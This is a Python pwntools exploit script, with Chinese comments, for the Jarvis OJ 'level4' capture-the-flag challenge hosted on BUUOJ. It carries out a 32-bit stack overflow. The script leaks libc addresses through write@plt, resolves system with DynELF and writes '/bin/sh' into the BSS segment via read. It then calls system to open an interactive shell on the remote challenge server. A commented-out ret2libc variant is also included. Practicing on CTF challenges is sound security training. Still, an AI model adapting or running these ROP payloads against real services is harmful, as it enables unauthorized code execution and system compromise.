'''
@Author       : 白银
@Date         : 2023-05-04 13:41:25
@LastEditors  : 白银
@LastEditTime : 2023-05-04 19:09:51
@FilePath     : /pwn/level4.py
@Description  : https://buuoj.cn/challenges#jarvisoj_level4
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './level4'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 26699)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/LibcSearcher_plus/libc-database/db/libc6-x32_2.23-0ubuntu3_i386.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/LibcSearcher_plus/libc-database/db/libc6_2.23-0ubuntu11.3_i386.so')
    # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()


padding = 0x8c  # ida看，buf和s差多少，加上r
write_plt = elf.plt['write']
print("write_plt------", hex(write_plt))
write_got = elf.got['write']
print("write_got------", hex(write_got))
main_addr = elf.symbols['main']
print("main_addr------", hex(main_addr))

'''ret2lic打不通，没法获取system函数，根据write_addr找不出libc
# 1 是文件描述符，表示标准输出
# write_got在write函数内部被解释为输出的数据的地址；
# 4 是要写入到标准输出的字节数
# ssize_t write(int fd, const void *buf, size_t count); //这是write函数
# ssize_t write(1, write_got, 4); //这是payload的布局
# 利用write()函数向输出流中写入数据，在这个过程中泄露出libc基址
payload = flat(['a' * padding , write_plt, main_addr, 1, write_got, 4])

io.sendline(payload)

# io.recv()
write_addr = u32(io.recv(4))# x86一个指针占4字节
# write_addr = u32(io.recvline()[:-1].ljust(4, b'\x00'))
print("write_addr------", hex(write_addr))
    
# libc = finder('write', write_addr)
# libc_base = write_addr - libc.dump('write')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')

libc_base = write_addr - libc.sym['write']
print("libc_base------", hex(libc_base))
system_addr = libc_base + libc.sym['system']
print("system_addr------", hex(system_addr))
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
print("binsh_addr------", hex(binsh_addr))

payload2 = flat(['a' * padding, system_addr, 0xdeadbeef, binsh_addr]) # x86在函数和参数之间要占位符

# sleep(1)
io.sendline(payload2)

io.interactive()
'''
bss_addr = 0x0804a024
read_plt = elf.symbols['read']
print("read_plt------", hex(read_plt))
deadbeef = 0xdeadbeef

def leak(write_got):
    # 1 是文件描述符，表示标准输出
    # write_got在write函数内部被解释为输出的数据的地址；
    # 4 是要写入到标准输出的字节数
    # ssize_t write(int fd, const void *buf, size_t count); //这是write函数
    # ssize_t write(1, write_got, 4); //这是payload的布局
    # 利用write()函数向输出流中写入数据，在这个过程中泄露出write_addr
    payload1 = flat(['a' * padding , write_plt, main_addr, 1, write_got, 4])
    io.sendline(payload1)
    write_addr = io.recv(4)
    return write_addr

dye = DynELF(leak, elf=elf)
system_addr = dye.lookup('system', 'libc')
print("system_addr------", hex(system_addr))

# 0 是文件描述符，表示从标准输入流中读取数据：io.send(b'/bin/sh\x00')
# bss_addr 是数据读取到的缓冲区地址，也就是字符串"/bin/sh"存储 BSS段中的地址
# 8 是需要从标准输入流中读取的字节数，也就是字符串"/bin/sh"的长度
# ssize_t read(int fd, void *buf, size_t count); //这是read函数
# ssize_t read(0, bss_addr, 8); //这是payload的布局
# 调用read函数来读取/bin/sh字符串并将其写入BSS段
payload2 = flat(['a' * padding, read_plt, main_addr, 0, bss_addr, 8])
io.send(payload2)
io.send(b'/bin/sh\x00')

# int system(const char *command); //这是read函数
# int system(bss_addr); //这是payload的布局
# 使用system调用存放在BSS段的"/bin/sh"
payload3 = flat(['a' * padding, system_addr, deadbeef, bss_addr])
io.sendline(payload3)

io.interactive()